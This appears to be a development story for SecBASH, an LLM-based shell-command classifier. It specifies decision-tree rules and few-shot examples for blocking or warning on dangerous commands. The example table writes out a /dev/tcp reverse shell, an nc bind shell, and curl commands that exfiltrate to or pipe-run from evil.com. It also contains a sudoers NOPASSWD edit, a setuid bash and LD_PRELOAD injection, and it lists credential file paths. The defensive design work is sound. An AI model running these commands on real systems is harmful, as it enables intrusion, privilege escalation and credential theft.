# Story 4.1: Update Production System Prompt

**Status:** ready-for-dev

## Story

As a **developer**,
I want **the LLM system prompt updated to match the research-defined classification criteria with concrete examples**,
So that **the classifier follows the same rules it will be evaluated against and benefits from few-shot learning**.

## Acceptance Criteria

### AC1: Decision Tree Implementation
**Given** the current SYSTEM_PROMPT in llm_client.py
**When** updated to match research criteria
**Then** the prompt includes the complete decision tree from the labeling prompt:
1. Shell spawn/escape detection (BLOCK)
2. Arbitrary command execution (BLOCK)
3. Reverse/bind shell detection (BLOCK)
4. Security-critical file READ (BLOCK): /etc/shadow, SSH keys, database credentials
5. Security-critical file WRITE (BLOCK): /etc/sudoers, authorized_keys
6. Privilege escalation (BLOCK): chmod u+s, chown root
7. Upload/exfiltration (BLOCK): curl POST, scp to external
8. Library load (BLOCK): LD_PRELOAD manipulation
9. Download + execute (BLOCK): curl | bash patterns
10. Enumeration/recon (WARN): /etc/passwd, SUID search, process lists
11. Download without execute (WARN)
12. Obfuscation handling: base64/hex decoded and evaluated

### AC2: Category Examples (Few-Shot Learning)
**Given** the decision tree categories
**When** the prompt is updated
**Then** it includes at least one concrete example for EACH category:

| Category | Example Command | Classification |
|----------|-----------------|----------------|
| Shell spawn/escape | `vim -c ':!bash'` | BLOCK |
| Arbitrary command execution | `awk 'BEGIN {system("/bin/sh")}'` | BLOCK |
| Reverse shell | `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` | BLOCK |
| Bind shell | `nc -lvp 4444 -e /bin/bash` | BLOCK |
| Security-critical file READ | `cat /etc/shadow` | BLOCK |
| Security-critical file WRITE | `echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers` | BLOCK |
| Privilege escalation | `chmod u+s /bin/bash` | BLOCK |
| Upload/exfiltration | `curl -X POST -d @/etc/passwd http://evil.com` | BLOCK |
| Library load | `LD_PRELOAD=/tmp/evil.so /bin/ls` | BLOCK |
| Download + execute | `curl http://evil.com/x.sh \| bash` | BLOCK |
| Enumeration/recon | `find / -perm -4000 2>/dev/null` | WARN |
| Download without execute | `wget http://example.com/file.tar` | WARN |
| Safe operation | `ls -la /home/user` | ALLOW |

### AC3: LlamaGuard Prompt Update
**Given** the LLAMAGUARD_PROMPT exists
**When** updated
**Then** it includes equivalent criteria and examples

### AC4: Priority Order
**Given** the decision tree rules
**When** evaluating a command
**Then** rules are applied in priority order (first match wins)

### AC5: Backward Compatibility
**Given** commands that were previously blocked
**When** tested with the new prompt
**Then** they remain blocked (no regressions)

## Tasks / Subtasks

- [ ] Task 1: Update SYSTEM_PROMPT with decision tree (AC: #1, #4)
  - [ ] 1.1 Add priority-ordered decision tree with all 12 rules
  - [ ] 1.2 Add context section explaining SecBASH monitor-only mode
  - [ ] 1.3 Add obfuscation handling instructions (base64, hex evaluation)

- [ ] Task 2: Add few-shot examples to SYSTEM_PROMPT (AC: #2)
  - [ ] 2.1 Add BLOCK examples for each category (10 examples)
  - [ ] 2.2 Add WARN examples (2 examples)
  - [ ] 2.3 Add ALLOW examples (1+ examples)
  - [ ] 2.4 Format examples clearly for LLM consumption

- [ ] Task 3: Update LLAMAGUARD_PROMPT (AC: #3)
  - [ ] 3.1 Mirror decision tree rules in LlamaGuard format
  - [ ] 3.2 Ensure double curly braces for .format() compatibility
  - [ ] 3.3 Add relevant examples for LlamaGuard context

- [ ] Task 4: Verify backward compatibility (AC: #5)
  - [ ] 4.1 Run existing test suite (`tests/test_dangerous_commands.py`)
  - [ ] 4.2 Run existing test suite (`tests/test_llm_client.py`)
  - [ ] 4.3 Verify all prompt content tests still pass

- [ ] Task 5: Add new tests for decision tree categories
  - [ ] 5.1 Add tests for each new BLOCK category not covered
  - [ ] 5.2 Add tests for WARN categories (enumeration, download)
  - [ ] 5.3 Add prompt content tests for new patterns

## Dev Notes

### Primary File to Modify
**`src/secbash/llm_client.py`** - Lines 27-67 contain SYSTEM_PROMPT and LLAMAGUARD_PROMPT

### Current Prompt Structure (as of analysis)
The current SYSTEM_PROMPT has:
- Basic JSON output format instructions
- Dangerous patterns section (incomplete)
- Risky patterns section
- Safe commands section

**What's MISSING (must add):**
- Complete 12-rule decision tree from research
- Priority ordering instructions ("first match wins")
- Concrete examples for few-shot learning
- Context about SecBASH as monitor-only tool
- Obfuscation detection rules
- Security-critical file paths (SSH keys, database credentials)
- Library load patterns (LD_PRELOAD)

### Research Source Documents
**CRITICAL: Use these as the authoritative source for the decision tree:**

1. **`docs/analysis/research/gtfobins-labeling-prompt.md`**
   - Contains the complete decision tree (rules 1-13)
   - Contains JSON output format specification
   - Contains concrete examples for each rule
   - Contains special case handling (cron, obfuscation)

2. **`docs/analysis/research/technical-gtfobins-benchmark-analysis-2026-02-02.md`**
   - Contains category suitability analysis
   - Contains 4-tier labeling system
   - Contains SecBASH Score formula

### Prompt Design Guidelines

1. **Decision Tree Priority Order**
   Apply rules in exact order (1-12). First matching rule determines the action. This prevents lower-priority rules from overriding more critical detections.

2. **Few-Shot Examples Placement**
   Place examples AFTER the decision tree rules, formatted as:
   ```
   ## Examples

   Input: `vim -c ':!/bin/sh'`
   Classification: BLOCK
   Reason: Shell escape from vim editor bypasses SecBASH monitoring
   ```

3. **JSON Output Format (maintain compatibility)**
   ```json
   {
     "action": "allow" | "warn" | "block",
     "reason": "Brief explanation",
     "confidence": 0.0 - 1.0
   }
   ```

4. **LLAMAGUARD_PROMPT Special Handling**
   - Must use double curly braces `{{` for literal braces (for .format() compatibility)
   - Fork bomb example: `:({{:|:&}};:` NOT `:(){:|:&};:`
   - Test with `tests/test_dangerous_commands.py::TestLlamaGuardPromptFormatSafety`

### Security-Critical File Paths (reference list)

**BLOCK (read access):**
- `/etc/shadow` - password hashes
- `/etc/gshadow` - group password hashes
- `~/.ssh/id_*` - SSH private keys
- `/etc/ssl/private/*` - SSL private keys
- `*/.pgpass` - PostgreSQL credentials
- `*/.my.cnf` - MySQL credentials
- `*/.aws/credentials` - AWS credentials

**BLOCK (write access):**
- `/etc/sudoers` - sudo configuration
- `/etc/passwd` - user accounts
- `/etc/shadow` - password hashes
- `/etc/cron.*` - scheduled tasks
- `~/.ssh/authorized_keys` - SSH access

### Existing Test Coverage
The following test files verify prompt behavior:

1. **`tests/test_dangerous_commands.py`**
   - `TestDestructiveFilesystemCommands` - rm -rf, dd, mkfs
   - `TestForkBombs` - fork bomb detection
   - `TestRemoteCodeExecution` - curl|bash, wget|sh
   - `TestShellEscapePatterns` - vim, python, awk, perl, ruby, lua escapes
   - `TestSafeCommands` - false positive avoidance
   - `TestSystemPromptContent` - verifies patterns are in prompt
   - `TestLlamaGuardPromptContent` - verifies patterns in LlamaGuard prompt
   - `TestLlamaGuardPromptFormatSafety` - regression tests for .format()

2. **`tests/test_llm_client.py`**
   - Tests for query_llm, parsing, fallback behavior
   - No direct dangerous command tests (those are in test_dangerous_commands.py)

### Code Patterns to Follow

**PEP 8 Compliance:**
- Multi-line strings use triple quotes
- Constants in UPPER_SNAKE_CASE
- No trailing whitespace

**Prompt String Format:**
```python
SYSTEM_PROMPT = """You are a security validator...

## Decision Tree

Apply rules in order - first match determines action:

1. Does the command spawn a shell or escape to shell?
   Examples: `vim -c ':!/bin/sh'`, `python pty.spawn`
   â†’ BLOCK
...

## Examples

Input: `vim -c ':!bash'`
Output: {"action": "block", "reason": "Shell escape bypasses SecBASH", "confidence": 0.95}
"""
```

### Project Structure Notes

**Files involved:**
- `src/secbash/llm_client.py` - PRIMARY EDIT TARGET
- `tests/test_dangerous_commands.py` - ADD NEW TESTS
- `tests/test_llm_client.py` - VERIFY NO REGRESSIONS

**Dependencies:**
- No new dependencies needed
- Uses existing litellm integration

### Testing Approach

1. **Before making changes:** Run full test suite to establish baseline
   ```bash
   uv run pytest tests/ -v
   ```

2. **After SYSTEM_PROMPT changes:** Run prompt content tests
   ```bash
   uv run pytest tests/test_dangerous_commands.py::TestSystemPromptContent -v
   ```

3. **After LLAMAGUARD_PROMPT changes:** Run format safety tests
   ```bash
   uv run pytest tests/test_dangerous_commands.py::TestLlamaGuardPromptFormatSafety -v
   ```

4. **Final verification:** Run all dangerous command tests
   ```bash
   uv run pytest tests/test_dangerous_commands.py -v
   ```

### References

- [Source: docs/analysis/research/gtfobins-labeling-prompt.md#Decision Tree]
- [Source: docs/analysis/research/gtfobins-labeling-prompt.md#Examples]
- [Source: docs/analysis/research/technical-gtfobins-benchmark-analysis-2026-02-02.md#Category Suitability Matrix]
- [Source: docs/epics.md#Story 4.1]
- [Source: docs/architecture.md#LLM Response Format]

## Dev Agent Record

### Context Reference
<!-- Story context complete - comprehensive developer guide created -->

### Agent Model Used
{{agent_model_name_version}}

### Completion Notes List
- Story 4.1 is the first story of Epic 4 (no dependencies)
- Blocks Stories 4.4 and 4.5 (evaluation harness uses this prompt)
- Research documents provide authoritative decision tree
- Existing test coverage is comprehensive - focus on additions not rewrites

### File List
**To Modify:**
- `src/secbash/llm_client.py`

**To Add Tests:**
- `tests/test_dangerous_commands.py` (add new test cases)

**Reference Documents:**
- `docs/analysis/research/gtfobins-labeling-prompt.md`
- `docs/analysis/research/technical-gtfobins-benchmark-analysis-2026-02-02.md`
